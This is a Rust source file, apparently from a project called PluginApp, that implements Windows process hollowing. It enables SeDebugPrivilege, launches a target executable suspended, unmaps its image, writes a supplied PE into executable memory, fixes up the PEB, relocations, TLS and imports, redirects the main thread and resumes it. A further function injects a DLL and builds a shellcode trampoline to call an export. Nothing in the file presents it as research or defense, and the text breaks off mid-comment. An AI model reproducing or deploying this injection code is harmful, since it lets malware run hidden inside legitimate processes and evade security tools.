use windows::{core::BOOL, Wdk::System::Threading::PROCESSINFOCLASS, Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::Debug::*, LibraryLoader::*, Memory::*, ProcessStatus::{EnumProcessModulesEx, GetModuleBaseNameA, ENUM_PROCESS_MODULES_EX_FLAGS}, Threading::*}}};
use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_strings::{s, PCSTR, PSTR};
use std::ffi::c_void;
use crate::PluginApp;

impl PluginApp {
    /// A corrected and robust implementation of process hollowing for EXEs.
    pub unsafe fn hollow_process_with_exe2(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
        log::info!("Starting process hollowing for target: {}", target_exe);

        // 1. Create the target process in a suspended state
        let startup_info = STARTUPINFOA::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line = format!("{}\0", target_exe);
        unsafe {
            // Enable SeDebugPrivilege
            let mut token: HANDLE = HANDLE(std::ptr::null_mut());
            if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token).is_ok() {
                let mut luid = LUID::default();
                if LookupPrivilegeValueA(PCSTR(std::ptr::null()), s!("SeDebugPrivilege"), &mut luid).is_ok() {
                    let mut tp = TOKEN_PRIVILEGES {
                        PrivilegeCount: 1,
                        Privileges: [LUID_AND_ATTRIBUTES {
                            Luid: luid,
                            Attributes: SE_PRIVILEGE_ENABLED,
                        }],
                    };
                    AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None)?;
                }
                CloseHandle(token)?;
            } else {
                log::warn!("Failed to open process token for SeDebugPrivilege");
            }

            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &startup_info,
                &mut process_info,
            )?
        };
        log::info!("Suspended process created. PID: {}", process_info.dwProcessId);

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        if let Err(e) = unsafe { GetThreadContext(h_thread, &mut context) } {
            log::error!("GetThreadContext failed: {:?}", unsafe { windows::Win32::Foundation::GetLastError().to_hresult().message() });
            return Err(anyhow::anyhow!("GetThreadContext failed: {:?}", e));
        }

        // Log original RSP and RBP
        let original_rsp = context.Rsp;
        let original_rbp = context.Rbp;
        log::info!("Original RSP: 0x{:X}\nOriginal RBP: 0x{:X}", original_rsp, original_rbp);

        // 2. Get the PEB address and image base address
        let mut pbi = PROCESS_BASIC_INFORMATION::default();
        let status = unsafe {
            NtQueryInformationProcess(
                h_process,
                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                std::ptr::null_mut(),
            )
        };
        if !status.is_ok() {
            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
        }
        log::info!("Remote PEB at: {:?}", pbi.PebBaseAddress);

        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
        unsafe {
            ReadProcessMemory(
                h_process,
                image_base_addr_ptr,
                remote_image_base_buf.as_mut_ptr() as *mut c_void,
                remote_image_base_buf.len(),
                None,
            )?
        };
        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
        log::info!("Original image base: 0x{:X}", remote_image_base);

        // 3. Unmap the original executable
        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
        if status.is_err() {
            log::warn!("NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
        } else {
            log::info!("NtUnmapViewOfSection succeeded.");
        }

        // 4. Parse PE headers using goblin
        let pe = goblin::pe::PE::parse(pe_data)?;
        let opt = pe.header.optional_header.ok_or_else(|| anyhow::anyhow!("Missing optional header"))?;
        let image_base = opt.windows_fields.image_base as usize;
        let entry_rva = opt.standard_fields.address_of_entry_point;
        let size_of_image = opt.windows_fields.size_of_image as usize;
        let size_of_headers = opt.windows_fields.size_of_headers as usize;
        log::info!(
            "Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}, Imports={:?}, TLS={:?}",
            size_of_image,
            entry_rva,
            image_base,
            opt.data_directories.get_import_table(),
            opt.data_directories.get_tls_table()
        );

        // 5. Allocate memory for the new image with PAGE_EXECUTE_READWRITE
        let new_base = unsafe {
            VirtualAllocEx(
                h_process,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        } as usize;
        if new_base == 0 {
            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
        }
        log::info!("New image allocated at: 0x{:X}", new_base);

        // 6. Write PE headers
        unsafe {
            WriteProcessMemory(
                h_process,
                new_base as *mut c_void,
                pe_data.as_ptr() as *const c_void,
                size_of_headers,
                None,
            )?
        };
        log::info!("Headers written at: 0x{:X}", new_base);

        // 7. Write sections
        use windows::Win32::System::Memory::{
            VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_NOACCESS,
        };
        for section in pe.sections.iter() {
            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
            let src_offset = section.pointer_to_raw_data as usize;
            let raw_size = section.size_of_raw_data as usize;
            if raw_size == 0 {
                continue;
            }
            if src_offset + raw_size > pe_data.len() {
                log::warn!("Section {} out of bounds, skipping", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()));
                continue;
            }
            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
            let write_section = unsafe { WriteProcessMemory(h_process, dest, src, raw_size, None) };
            if !write_section.is_ok() {
                log::warn!("WriteProcessMemory failed for section {}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()));
            } else {
                log::info!("Section {} written at: 0x{:X}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), dest as usize);
            }
        }

        // 8. Update PEB image base
        let new_base_bytes = new_base.to_le_bytes();
        unsafe {
            WriteProcessMemory(
                h_process,
                image_base_addr_ptr,
                new_base_bytes.as_ptr() as *const c_void,
                new_base_bytes.len(),
                None,
            )?
        };
        log::info!("Remote PEB image base updated to 0x{:X}", new_base);

        // 9. Apply relocations if needed
        if new_base != image_base {
            log::info!("Applying relocations (delta: 0x{:X})...", new_base.wrapping_sub(image_base));
            if let Err(e) = apply_relocations(pe_data, h_process, new_base, image_base) {
                log::error!("Relocations failed: {:?}", e);
                return Err(e);
            }
        }

        // 10. Patch TLS directory if present
        let tls_dir_opt = opt.data_directories.get_tls_table();
        if let Some(tls_dir) = tls_dir_opt {
            if tls_dir.virtual_address != 0 && tls_dir.size >= 24 {
                log::info!("Patching TLS directory at RVA 0x{:X}", tls_dir.virtual_address);
                let tls_va = tls_dir.virtual_address as usize;
                let tls_rva_offset = rva_to_offset(pe_data, tls_va).unwrap_or(0);
                    #[repr(C)]
                    #[derive(Copy, Clone, Debug)]
                    struct ImageTlsDirectory64 {
                        start_address_of_raw_data: u64,
                        end_address_of_raw_data: u64,
                        address_of_index: u64,
                        address_of_callbacks: u64,
                        size_of_zero_fill: u32,
                        characteristics: u32,
                    }

                if tls_rva_offset > 0 && tls_rva_offset + std::mem::size_of::<ImageTlsDirectory64>() <= pe_data.len() {


                    let tls_dir_struct: &ImageTlsDirectory64 = unsafe { &*(pe_data.as_ptr().add(tls_rva_offset) as *const ImageTlsDirectory64) };
                    let mut patched_tls = *tls_dir_struct;
                    let delta = new_base.wrapping_sub(image_base);

                    let patch_field = |field: u64| {
                        if field != 0 {
                            let new_field = field.wrapping_add(delta as u64);
                            log::debug!("TLS field 0x{:X} patched to 0x{:X}", field, new_field);
                            new_field
                        } else {
                            0
                        }
                    };

                    patched_tls.start_address_of_raw_data = patch_field(tls_dir_struct.start_address_of_raw_data);
                    patched_tls.end_address_of_raw_data = patch_field(tls_dir_struct.end_address_of_raw_data);
                    patched_tls.address_of_index = patch_field(tls_dir_struct.address_of_index);
                    patched_tls.address_of_callbacks = patch_field(tls_dir_struct.address_of_callbacks);

                    let remote_tls_addr = (new_base + tls_va) as *mut c_void;
                    if unsafe {
                        WriteProcessMemory(
                            h_process,
                            remote_tls_addr,
                            &patched_tls as *const _ as *const c_void,
                            std::mem::size_of::<ImageTlsDirectory64>(),
                            None,
                        )
                    }
                    .is_ok()
                    {
                        log::info!("TLS directory patched successfully at 0x{:X}", remote_tls_addr as usize);
                    } else {
                        log::warn!("Failed to write patched TLS directory to remote process.");
                    }

                    // Log TLS callbacks for debugging
                    if patched_tls.address_of_callbacks != 0 {
                        let mut callback_addr = patched_tls.address_of_callbacks;
                        let mut index = 0;
                        loop {
                            let mut callback: u64 = 0;
                            if unsafe {
                                ReadProcessMemory(
                                    h_process,
                                    callback_addr as *const c_void,
                                    &mut callback as *mut _ as *mut c_void,
                                    std::mem::size_of::<u64>(),
                                    None,
                                )
                            }
                            .is_ok()
                            {
                                if callback == 0 {
                                    break;
                                }
                                log::debug!("TLS callback {} at 0x{:X}", index, callback);
                                callback_addr += std::mem::size_of::<u64>() as u64;
                                index += 1;
                            } else {
                                log::warn!("Failed to read TLS callback at 0x{:X}", callback_addr);
                                break;
                            }
                        }
                    }
                } else {
                    log::warn!("TLS directory offset out of bounds, skipping patch.");
                }
            }
        }

        // 11. Resolve imports
        log::info!("Resolving imports...");
        if let Some(import_dir) = opt.data_directories.get_import_table() {
            if import_dir.virtual_address != 0 && import_dir.size != 0 {
                if let Err(e) = resolve_imports(pe_data, h_process, new_base as *mut c_void) {
                    log::error!("Import resolution failed: {:?}", e);
                    return Err(e);
                }
            } else {
                log::info!("No import table found in PE.");
            }
        } else {
            log::info!("No import directory found in PE.");
        }

        // 12. Patch NtManageHotPatch for Windows 11 24H2+ compatibility
        // if let Err(e) = patch_nt_manage_hotpatch64(h_process) {
        //     let x = unsafe { GetLastError().to_hresult().message() };
        //     log::warn!("patch_nt_manage_hotpatch64 failed: {:?} {:?}", e, x);
        // } else {
        //     log::info!("NtManageHotPatch64 patched successfully");
        //     log::info!("NtManageHotPatch64 Win32: {}", unsafe { GetLastError().to_hresult().message() });
        // }

        // 13. Set final section protections
        log::info!("Setting final section protections...");
        for section in pe.sections.iter() {
            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
            let characteristics = section.characteristics;
            if size > 0 {
                let protection = if characteristics & 0x20000000 != 0 { // EXECUTE
                    if characteristics & 0x40000000 != 0 { // READ
                        if characteristics & 0x80000000 != 0 {
                            PAGE_EXECUTE_READWRITE // Allow writes if needed
                        } else {
                            PAGE_EXECUTE_READ
                        }
                    } else {
                        PAGE_EXECUTE_READ
                    }
                } else if characteristics & 0x80000000 != 0 { // WRITE
                    PAGE_READWRITE
                } else if characteristics & 0x40000000 != 0 { // READ
                    PAGE_READONLY
                } else {
                    PAGE_NOACCESS
                };
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, protection, &mut old_protect) } {
                    log::warn!(
                        "Failed to set final protection for section {}: {:?}",
                        String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()),
                        e
                    );
                } else {
                    log::info!("VirtualProtectEx Win32: {}", unsafe { GetLastError().to_hresult().message() });
                    log::warn!(
                        "Set protection for section {} to 0x{:X} at 0x{:X} (size: 0x{:X})",
                        String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()),
                        protection.0,
                        dest as usize,
                        size
                    );
                }
            }
        }
        // Set PE header to READONLY
        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_READONLY, &mut old_protect_header) } {
            log::warn!("Failed to set final protection for PE header: {:?}", e);
        }
        // unsafe { FlushInstructionCache(h_process, None, 0)? };
        // log::info!("Final protections set and instruction cache flushed.");
        
        // 14. Set thread context to new entry point
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        log::info!("FlushInstructionCache Win32: {}", unsafe { GetLastError().to_hresult().message() });
        unsafe { GetThreadContext(h_thread, &mut context)? };
        log::error!("GetThreadContext Win32: {}", unsafe { windows::Win32::Foundation::GetLastError().to_hresult().message() });
        #[cfg(target_arch = "x86_64")]
        {
            context.Rsp = (context.Rsp & !0xF) - 8; // Align stack to 16 bytes
            context.Rip = new_base as u64 + entry_rva as u64;
        }
        #[cfg(target_arch = "x86")]
        {
            context.Eip = (new_base as u32).wrapping_add(entry_rva);
        }
        log::info!("Setting thread entry point to 0x{:X}, RSP: 0x{:X}", new_base as u64 + entry_rva as u64, context.Rsp);
        let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
        if let Err(e) = set_ctx {
            let err = unsafe { windows::Win32::Foundation::GetLastError() };
            log::error!("Win32 Error: {}", err.to_hresult().message());
            return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
        }

        // 15. Resume thread
        log::info!("Resuming main thread...");
        let resume_count = unsafe { ResumeThread(h_thread) };
        if resume_count == u32::MAX {
            let err = unsafe { windows::Win32::Foundation::GetLastError() };
            log::error!("Win32 Error: {}", err.to_hresult().message());
            return Err(anyhow::anyhow!("ResumeThread failed"));
        }
        log::info!("ResumeThread returned: {}", resume_count);

        log::info!("Hollowing complete. New process PID: {}", process_info.dwProcessId);

        // Clean up handles
        unsafe { CloseHandle(h_thread)? };
        unsafe { CloseHandle(h_process)? };

        Ok(process_info.dwProcessId)
    }

        /// Classic process hollowing for EXEs (not DLLs)
        /// - Creates a suspended process for `target_exe`
        /// - Unmaps the original image
        /// - Maps the provided PE buffer as the new image
        /// - Sets thread context to new entry point
        /// - Resumes the main thread
    pub unsafe fn hollow_process_with_exe_original(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
        use windows::Win32::System::Threading::*;
        use windows::Win32::System::Diagnostics::Debug::*;
        use windows::Win32::System::Memory::*;
        use windows::Wdk::System::Threading::PROCESSINFOCLASS;
        use windows::Wdk::System::Threading::NtQueryInformationProcess;
        use windows::Wdk::System::Memory::NtUnmapViewOfSection;
        use std::ffi::c_void;

        log::warn!("[hollow] Starting hollow_process_with_exe for target: {}", target_exe);

        // 1. Create suspended process
        let mut startup_info = STARTUPINFOA::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line = format!("{}\0", target_exe);
        let create_res = unsafe {
            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                BOOL(0).into(),
                CREATE_SUSPENDED,
                None,
                None,
                &mut startup_info,
                &mut process_info,
            )
        };
        if let Err(e) = create_res {
            log::warn!("[hollow][error] CreateProcessA failed: {}", e);
            return Err(anyhow::anyhow!("CreateProcessA failed: {}", e));
        }
        log::warn!("[hollow] Suspended process created. PID: {}", process_info.dwProcessId);

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        // 2. Get remote PEB base address
        let mut peb_addr_buf = [0u8; 8];
        let peb_base_addr = {
            let mut pbi = PROCESS_BASIC_INFORMATION::default();
            let mut ret_len = 0u32;
            let status = unsafe {
                NtQueryInformationProcess(
                    h_process,
                    PROCESSINFOCLASS(0),
                    &mut pbi as *mut _ as *mut c_void,
                    std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                    &mut ret_len,
                )
            };
            if status != windows::Win32::Foundation::NTSTATUS(0) {
                log::warn!("[hollow][error] NtQueryInformationProcess failed: status=0x{:X}", status.0);
                return Err(anyhow::anyhow!("NtQueryInformationProcess failed: status=0x{:X}", status.0));
            }
            log::warn!("[hollow] PebBaseAddress: 0x{:X}", pbi.PebBaseAddress as usize);
            pbi.PebBaseAddress as usize
        };
        let image_base_addr_ptr = (peb_base_addr + 0x10) as *mut c_void;
        let read_res = unsafe {
            ReadProcessMemory(h_process, image_base_addr_ptr, peb_addr_buf.as_mut_ptr() as _, 8, None)
        };
        if let Err(e) = read_res {
            log::warn!("[hollow][error] ReadProcessMemory (PEB image base) failed: {}", e);
            return Err(anyhow::anyhow!("ReadProcessMemory (PEB image base) failed: {}", e));
        }
        let remote_image_base = usize::from_le_bytes(peb_addr_buf);
        log::warn!("[hollow] Remote image base: 0x{:X}", remote_image_base);

        // 3. Unmap original image
        let unmap_status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
        log::warn!("[hollow] NtUnmapViewOfSection status: 0x{:X}", unmap_status.0);

        // 4. Parse new EXE headers
        if pe_data.len() < 0x100 {
            log::warn!("[hollow][error] PE buffer too small");
            return Err(anyhow::anyhow!("PE buffer too small"));
        }
        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
        let nt_headers = &pe_data[e_lfanew..];
        let size_of_image = u32::from_le_bytes(nt_headers[0x50..0x54].try_into().unwrap()) as usize;
        let entry_rva = u32::from_le_bytes(nt_headers[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as usize;
        let image_base = u64::from_le_bytes(nt_headers[0x18..0x20].try_into().unwrap()) as usize;
        log::warn!("[hollow] Parsed PE: image_base=0x{:X}, size_of_image=0x{:X}, entry_rva=0x{:X}", image_base, size_of_image, entry_rva);

        // 5. Allocate memory for new image
        let alloc = unsafe {
            VirtualAllocEx(
                h_process,
                Some(image_base as *mut _),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        let new_base = if alloc.is_null() {
            log::warn!("[hollow][warn] Preferred base allocation failed, trying fallback...");
            let fallback = unsafe {
                VirtualAllocEx(
                    h_process,
                    None,
                    size_of_image,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                )
            };
            if fallback.is_null() {
                log::warn!("[hollow][error] VirtualAllocEx for new image failed");
                return Err(anyhow::anyhow!("VirtualAllocEx for new image failed"));
            }
            fallback as usize
        } else {
            alloc as usize
        };
        log::warn!("[hollow] New image base: 0x{:X}", new_base);

        // 6. Write headers
        let size_of_headers = u32::from_le_bytes(nt_headers[0x54..0x58].try_into().unwrap()) as usize;
        let write_headers_res = unsafe {
            WriteProcessMemory(h_process, new_base as *mut c_void, pe_data.as_ptr() as _, size_of_headers, None)
        };
        if let Err(e) = write_headers_res {
            log::warn!("[hollow][error] WriteProcessMemory (headers) failed: {}", e);
            return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed: {}", e));
        }
        log::warn!("[hollow] Wrote headers (size: 0x{:X})", size_of_headers);

        // 7. Write sections
        let num_sections = u16::from_le_bytes(nt_headers[6..8].try_into().unwrap()) as usize;
        let section_table = e_lfanew + 0x18 + u16::from_le_bytes(nt_headers[20..22].try_into().unwrap()) as usize;
        for i in 0..num_sections {
            let sec_off = section_table + i * 40;
            let virt_addr = u32::from_le_bytes(pe_data[sec_off + 12..sec_off + 16].try_into().unwrap()) as usize;
            let raw_size = u32::from_le_bytes(pe_data[sec_off + 16..sec_off + 20].try_into().unwrap()) as usize;
            let raw_ptr = u32::from_le_bytes(pe_data[sec_off + 20..sec_off + 24].try_into().unwrap()) as usize;
            if raw_size == 0 || raw_ptr == 0 { continue; }
            let write_sec_res = unsafe {
                WriteProcessMemory(
                    h_process,
                    (new_base + virt_addr) as *mut c_void,
                    pe_data[raw_ptr..raw_ptr + raw_size].as_ptr() as _,
                    raw_size,
                    None,
                )
            };
            if let Err(e) = write_sec_res {
                log::warn!("[hollow][error] WriteProcessMemory (section {}) failed: {}", i, e);
                return Err(anyhow::anyhow!("WriteProcessMemory (section {}) failed: {}", i, e));
            }
            log::warn!("[hollow] Wrote section {}: VA=0x{:X}, size=0x{:X}", i, virt_addr, raw_size);
        }

        // 8. Update remote PEB image base if needed
        if new_base != remote_image_base {
            let new_base_bytes = new_base.to_le_bytes();
            let update_peb_res = unsafe {
                WriteProcessMemory(h_process, image_base_addr_ptr, new_base_bytes.as_ptr() as *const c_void, 8, None)
            };
            if let Err(e) = update_peb_res {
                log::warn!("[hollow][error] WriteProcessMemory (PEB update) failed: {}", e);
                return Err(anyhow::anyhow!("WriteProcessMemory (PEB update) failed: {}", e));
            }
            log::warn!("[hollow] Updated PEB image base to 0x{:X}", new_base);
        }

        // 9. Set thread context to new entry point
        let mut context = CONTEXT::default();
        #[cfg(target_arch = "x86_64")]
        {
            context.ContextFlags = CONTEXT_ALL_AMD64;
        }
        #[cfg(target_arch = "x86")]
        {
            context.ContextFlags = CONTEXT_ALL_X86;
        }
        let get_ctx_res = unsafe { GetThreadContext(h_thread, &mut context) };
        if let Err(e) = get_ctx_res {
            log::warn!("[hollow][error] GetThreadContext failed: {}", e);
            return Err(anyhow::anyhow!("GetThreadContext failed: {}", e));
        }
        #[cfg(target_arch = "x86_64")]
        {
            context.Rip = (new_base + entry_rva) as u64;
            log::warn!("[hollow] Set CONTEXT.Rip = 0x{:X}", context.Rip);
        }
        #[cfg(target_arch = "x86")]
        {
            context.Eip = (new_base + entry_rva) as u32;
            log::warn!("[hollow] Set CONTEXT.Eip = 0x{:X}", context.Eip);
        }
        let set_ctx_res = unsafe { SetThreadContext(h_thread, &context) };
        if let Err(e) = set_ctx_res {
            log::warn!("[hollow][error] SetThreadContext failed: {}", e);
            return Err(anyhow::anyhow!("SetThreadContext failed: {}", e));
        }

        // 10. Resume main thread
        let resume_res = unsafe { ResumeThread(h_thread) };
        log::warn!("[hollow] ResumeThread returned: {}", resume_res);

        log::warn!("[hollow] Hollowing complete. New process PID: {}", process_info.dwProcessId);
        Ok(process_info.dwProcessId)
    }
    
        // Improved process hollowing with proper relocations and IAT
    pub unsafe fn inject_hollowed_process_improved(
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        main_thread_handle: HANDLE
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
        log::info!("Starting inject_hollowed_process_improved");
            // Get proper entry point and base address
            let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(dll_data)?;

            // Try to allocate at preferred base first, fallback if needed
            let mut alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                log::info!("Alloc is NULL");
                // Fallback allocation
                alloc = VirtualAllocEx(
                    process_handle,
                    None,
                    size_of_image,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if alloc.is_null() {
                    log::info!("[hollow][error] VirtualAllocEx failed");
                    return Err(anyhow::anyhow!("VirtualAllocEx failed"));
                }
            }

            let actual_base = alloc as usize;
            log::info!("DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
            log::info!("[debug] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);

            // Debug: check memory protection of allocated region
            use windows::Win32::System::Memory::VirtualQueryEx;
            use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
            let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
            let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
            let vq_res = VirtualQueryEx(
                process_handle,
                Some(actual_base as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            );
            if vq_res == 0 {
                log::info!("[debug] VirtualQueryEx failed for alloc: 0x{:X}", actual_base);
            } else {
                let mbi = mbi.assume_init();
                log::info!("[debug] VirtualQueryEx alloc: Base=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                    mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
            }

            // Map PE sections
            log::info!("Mapping PE sections");
            Self::map_pe_sections(dll_data, process_handle, alloc)?;

            // Apply relocations if base changed
            if actual_base != preferred_base {
                log::info!("Applying relocations");
                Self::apply_relocations(dll_data, process_handle, actual_base, preferred_base)?;
            }

            // Resolve imports (IAT fixups)
            log::info!("Resolving imports");
            Self::resolve_imports(dll_data, process_handle, alloc)?;
            // // Get function RVA and calculate remote address
            // let function_rva = Self::get_export_rva(dll_data, function_name)?;
            // let remote_export = actual_base + function_rva as usize;

            // // --- Shellcode stub (x64) ---
            // // mov rcx, 0
            // // mov rax, <remote_export>
            // // call rax
            // // mov ecx, 0
            // // mov rax, <ExitProcess>
            // // call rax
            // // ret
            // let exit_process = GetProcAddress(
            //     GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap(),
            //     PCSTR(b"ExitProcess\0".as_ptr()),
            // ).unwrap() as usize;

            // let mut shellcode: Vec<u8> = vec![
            //     0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
            //     0x48, 0xB8, // mov rax, <remote_export>
            // ];
            // shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            // shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            // shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.push(0xC3); // ret

            // // Allocate memory for shellcode
            // let shellcode_addr = VirtualAllocEx(
            //     process_handle,
            //     None,
            //     shellcode.len(),
            //     MEM_COMMIT | MEM_RESERVE,
            //     PAGE_EXECUTE_READWRITE,
            // );
            // if shellcode_addr.is_null() {
            //     return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            // }
            // WriteProcessMemory(
            //     process_handle,
            //     shellcode_addr,
            //     shellcode.as_ptr() as _,
            //     shellcode.len(),
            //     None,
            // ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // // Patch the main thread context to start at the shellcode stub
            // log::info!("[info] Setting main thread context to shellcode stub (calls export, then ExitProcess)");

            // --- Trampoline shellcode approach ---
            // 1. Allocate memory for shellcode in remote process
            // 2. Write shellcode: call export, then call ExitProcess
            // 3. Patch main thread context to shellcode
            // 4. Resume main thread

            // Get export address
            let function_rva = Self::get_export_rva(dll_data, function_name)?;
            let remote_export = actual_base + function_rva as usize;
            log::info!("Trampoline: export '{}' at 0x{:X}", function_name, remote_export);

            // Get ExitProcess address
            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
            let exit_process = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr())).unwrap() as usize;

            // x64 shellcode:
            // mov rcx, 0
            // mov rax, <remote_export>
            // call rax
            // mov ecx, 0
            // mov rax, <ExitProcess>
            // call rax
            // ret
            let mut shellcode: Vec<u8> = vec![
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
                0x48, 0xB8, // mov rax, <remote_export>
            ];
            shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.push(0xC3); // ret

            // Allocate memory for shellcode
            let shellcode_addr = VirtualAllocEx(
                process_handle,
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if shellcode_addr.is_null() {
                log::info!("[hollow][error] VirtualAllocEx for shellcode failed");
                return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            }
            // Write shellcode
            WriteProcessMemory(
                process_handle,
                shellcode_addr,
                shellcode.as_ptr() as _,
                shellcode.len(),
                None,
            ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // Patch main thread context to shellcode
            log::info!("Patching main thread context to trampoline shellcode at 0x{:X}", shellcode_addr as usize);
            let mut context = CONTEXT::default();
            #[cfg(target_arch = "x86_64")]
            {
                context.ContextFlags = CONTEXT_ALL_AMD64;
            }
            #[cfg(target_arch = "x86")]
            {
                context.ContextFlags = CONTEXT_ALL_X86;
            }
            GetThreadContext(main_thread_handle, &mut context)?;
            #[cfg(target_arch = "x86_64")]
            {
                context.Rip = shellcode_addr as u64;
                log::info!("[info] Set CONTEXT.Rip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            #[cfg(target_arch = "x86")]
            {
                context.Eip = shellcode_addr as u32;
                log::info!("[info] Set CONTEXT.Eip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            SetThreadContext(main_thread_handle, &context)?;

            log::info!("[info] Main thread context patched. Resuming main thread...");
            // let resume_count = ResumeThread(main_thread_handle);
            // log::info!("[info] ResumeThread(main) returned: {}", resume_count);
            log::info!("Hollowing complete. Export will be called by trampoline shellcode.");
            Ok(())
        }
    }

    
    /// Call an exported DLL function in a hollowed process
    /// Arguments:
    /// - process_handle: HANDLE to the hollowed process
    /// - dll_data: &[u8] of the DLL image
